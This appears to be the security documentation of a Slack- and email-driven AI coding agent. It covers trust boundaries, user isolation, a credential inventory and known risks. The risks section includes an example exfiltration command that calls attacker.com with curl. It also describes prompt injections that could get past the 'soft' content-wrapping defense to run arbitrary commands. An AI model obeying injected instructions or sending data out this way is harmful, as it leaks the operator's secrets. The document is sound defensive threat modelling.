# Security

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│                      UNTRUSTED                                   │
│   Slack messages, email body content, web-fetched content        │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│               BOUNDARY 1: Access Control                         │
│   Slack bridge: SLACK_ALLOWED_USERS allowlist                    │
│   Email: allowed senders + shared secret (HORNET_SECRET)         │
│   Content wrapping: external messages get security boundaries    │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│               BOUNDARY 2: OS User Isolation                      │
│   hornet_agent (uid 1001) — separate home, no sudo              │
│   Cannot read admin home directory (admin home is 700)            │
│   Docker only via wrapper (blocks --privileged, host mounts)     │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│               BOUNDARY 3: Network (if firewall applied)          │
│   Outbound: HTTP/HTTPS/SSH/DNS only                              │
│   No reverse shells, raw sockets, or non-standard ports          │
│   Localhost: bridge API, postgres, ollama                         │
└─────────────────────────────────────────────────────────────────┘
```

## User Model

| User | Role | Sudo | Groups |
|------|------|------|--------|
| `<admin_user>` | Admin (human) | `(ALL) ALL`, `(hornet_agent) NOPASSWD: ALL` | \<admin_user\>, wheel, docker, hornet_agent |
| `hornet_agent` | Agent (automated) | Only `/usr/local/bin/hornet-docker` as root | hornet_agent |

**Admin → hornet_agent access**: The admin user is in the `hornet_agent` group and has `NOPASSWD: ALL` as hornet_agent via sudo. This is intentional for management. Run `bin/harden-permissions.sh` to ensure pi state files are owner-only (prevents passive group-level reads).

**hornet_agent → admin access**: None. Admin home is `700`, hornet_agent is not in the admin user's group.

## Data Flows

```
Slack @mention
  → slack-bridge (Socket Mode, admin user)
    → content wrapping (security boundaries added)
      → Unix socket (~/.pi/session-control/*.sock)
        → control-agent (pi session, hornet_agent user)
          → creates todo
          → delegates to dev-agent (pi session, hornet_agent user)
            → git worktree → code changes → git push
          → dev-agent reports back
        → control-agent replies via curl → bridge HTTP API (127.0.0.1:7890)
      → Slack thread reply
```

## Credential Inventory

| Secret | Location | Perms | Purpose |
|--------|----------|-------|---------|
| `OPENCODE_ZEN_API_KEY` | `~/.config/.env` | `600` | LLM API access |
| `GITHUB_TOKEN` | `~/.config/.env` | `600` | GitHub PAT (scoped to hornet-fw) |
| `AGENTMAIL_API_KEY` | `~/.config/.env` | `600` | AgentMail inbox access |
| `KERNEL_API_KEY` | `~/.config/.env` | `600` | Kernel cloud browsers |
| `HORNET_SECRET` | `~/.config/.env` | `600` | Email authentication shared secret |
| SSH key | `~/.ssh/id_ed25519` | `600` | Git push as hornet-fw |
| `SLACK_BOT_TOKEN` | Bridge `.env` | `600` | Slack bot OAuth token |
| `SLACK_APP_TOKEN` | Bridge `.env` | `600` | Slack Socket Mode token |

## Known Risks

### Agent has unrestricted shell
Within its own user permissions, `hornet_agent` can run any command. There is no tool policy layer, command allowlist, or exec approval system. A prompt injection that bypasses the content wrapping could instruct the agent to run arbitrary commands as `hornet_agent`.

### Agent has internet access
Even with port-based firewall rules, the agent can reach any host over HTTPS. Data exfiltration via `curl https://attacker.com?data=...` is possible. The firewall blocks reverse shells and non-standard ports but does not prevent HTTPS exfil.

### Content wrapping is a soft defense
The `<<<EXTERNAL_UNTRUSTED_CONTENT>>>` boundaries and security notice ask the LLM to ignore injected instructions. This raises the bar but is not a hard security boundary — sufficiently clever injections may still succeed.

### Session logs contain full history
Pi session logs (`.jsonl` files) contain the complete conversation history including tool calls, file contents, and command outputs. If permissions are not hardened (see `bin/harden-permissions.sh`), these are group-readable.

## Security Scripts

| Script | Purpose | Run as |
|--------|---------|--------|
| `bin/security-audit.sh` | Check current security posture | hornet_agent or admin |
| `bin/harden-permissions.sh` | Lock down pi state file permissions | hornet_agent |
| `bin/setup-firewall.sh` | Apply port-based network restrictions | root |

## Reporting

This is a private repo. Report security issues directly to the admin.
